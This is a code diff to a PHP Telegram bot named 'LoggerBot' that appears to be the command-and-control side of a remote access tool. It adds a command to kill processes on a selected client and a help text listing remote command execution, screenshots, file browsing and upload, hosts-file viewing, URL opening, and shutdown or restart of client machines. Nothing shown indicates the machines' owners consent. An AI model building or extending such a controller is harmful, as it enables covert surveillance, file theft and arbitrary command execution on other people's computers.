@@ -374,6 +374,14 @@ class LoggerBot {
                             "Command '$commandType' ($commandParams[action]) completed for client $clientId: $result"
                         );
                     }
+                } elseif ($commandType === 'end_task' && isset($commandParams['process_name'])) {
+                    $message = "Command 'end_task' for process '{$commandParams['process_name']}' on client $clientId: ";
+                    if (isset($resultData['status']) && $resultData['status'] === 'success') {
+                        $message .= "Successfully terminated.";
+                    } else {
+                        $message .= "Failed - " . ($resultData['message'] ?? 'Unknown error');
+                    }
+                    $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
                 } else {
                     $this->sendTelegramMessage(
                         Config::$ADMIN_CHAT_ID,
@@ -557,7 +565,8 @@ class LoggerBot {
             '/sleep' => 'Sleep',
             '/restart' => 'Restart',
             '/listusers' => 'List Users',
-            '/addadmin' => 'Add Admin'
+            '/addadmin' => 'Add Admin',
+            '/end_task' => 'End Task' // اضافه شده
         ];
 
         $keyboard = ['inline_keyboard' => []];
@@ -644,6 +653,11 @@ class LoggerBot {
             case preg_match('/^\/tasks$/', $command):
                 $commandData = ['type' => 'process_management', 'params' => ['action' => 'list']];
                 $response['data'] = 'List tasks command queued';
+                break;
+
+            case preg_match('/^\/end_task\s+(.+)/', $command, $matches):
+                $commandData = ['type' => 'end_task', 'params' => ['process_name' => $matches[1]]];
+                $response['data'] = "End task command queued for process: {$matches[1]}";
                 break;
 
             case preg_match('/^\/signout$/', $command):
@@ -1082,11 +1096,34 @@ class LoggerBot {
     }
 
     private function sendHelpMessage($recipient, $isClient = false) {
-        $message = "No client selected. Use /start or /select <client_id>.";
+        $message = "Available commands:\n" .
+                   "/start - Show client list\n" .
+                   "/select <client_id> - Select a client\n" .
+                   "/status - System status\n" .
+                   "/screenshot - Take screenshot\n" .
+                   "/exec <command> - Execute command\n" .
+                   "/hosts - View hosts file\n" .
+                   "/browse <path> - Browse directory\n" .
+                   "/browse_recursive <path> - Recursive directory listing\n" .
+                   "/get-info - System info\n" .
+                   "/go <url> - Open URL\n" .
+                   "/shutdown - Shutdown system\n" .
+                   "/upload <file_path> - Upload file\n" .
+                   "/upload_url <url> - Upload from URL\n" .
+                   "/tasks - List running tasks\n" .
+                   "/end_task <process_name> - End a running process\n" .
+                   "/signout - Sign out\n" .
+                   "/sleep - Sleep system\n" .
+                   "/restart - Restart system\n" .
+                   "/logs - View server logs\n" .
+                   "/screens - List screenshots\n" .
+                   "/test_telegram - Test Telegram API\n" .
+                   "/listusers - List active users\n" .
+                   "/addadmin <user_id> - Add admin";
         if ($isClient) {
             return $message;
         }
-        $this->sendClientKeyboard($recipient);
+        $this->sendTelegramMessage($recipient, $message);
         return $message;
     }
 }
